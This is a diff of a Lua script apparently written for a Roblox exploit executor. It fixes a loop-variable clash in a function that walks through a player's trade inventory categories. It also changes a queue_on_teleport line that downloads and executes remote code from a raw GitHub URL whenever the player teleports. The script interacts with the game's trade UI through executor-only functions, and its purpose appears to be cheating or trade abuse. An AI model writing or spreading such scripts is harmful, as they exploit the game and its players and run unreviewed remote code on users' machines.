@@ -211,57 +211,57 @@ function GetPlayerInventory(Player)
 
 		task.wait(0.6)
 
-		for i = 1, 12 do
-			firesignal(LocalPlayer.PlayerGui.AppUI.Trade.ItemTypesContainer.ScrollingGrid[i].Activated)
+		for i2 = 1, 12 do
+			firesignal(LocalPlayer.PlayerGui.AppUI.Trade.ItemTypesContainer.ScrollingGrid[i2].Activated)
 
 			for i, v in next, LocalPlayer.PlayerGui.AppUI.Trade.ItemsContainer.ScrollingGrid:GetChildren() do
 				local Category = "Nil"
 				
-				if i == 1 then
+				if i2 == 1 then
 					Category = "Vehicule"
 				end
 				
-				if i == 2 then
+				if i2 == 2 then
 					Category = "Furniture"
 				end
 				
-				if i == 3 then
+				if i2 == 3 then
 					Category = "Weapon Skin"
 				end
 				
-				if i == 4 then
+				if i2 == 4 then
 					Category = "Texture"
 				end
 				
-				if i == 5 then
+				if i2 == 5 then
 					Category = "Rim"
 				end
 				
-				if i == 6 then
+				if i2 == 6 then
 					Category = "Spoiler"
 				end
 				
-				if i == 7 then
+				if i2 == 7 then
 					Category = "Tire Sticker"
 				end
 				
-				if i == 8 then
+				if i2 == 8 then
 					Category = "Tire Style"
 				end
 				
-				if i == 9 then
+				if i2 == 9 then
 					Category = "Horn"
 				end
 				
-				if i == 10 then
+				if i2 == 10 then
 					Category = "Color"
 				end
 				
-				if i == 11 then
+				if i2 == 11 then
 					Category = "Drift"
 				end
 				
-				if i == 12 then
+				if i2 == 12 then
 					Category = "Consumable"
 				end
 				
@@ -428,7 +428,7 @@ ReplicatedStorageService.OtherTradeServerData.OnClientEvent:Connect(function(Ser
 
 	Cooldown = false
 
-	queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/testdfsdfd/bwds/refs/heads/main/test3'))()")
+	queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/testdfsdfd/bwds/refs/heads/main/test4'))()")
 
 	repeat
 		task.wait(1)
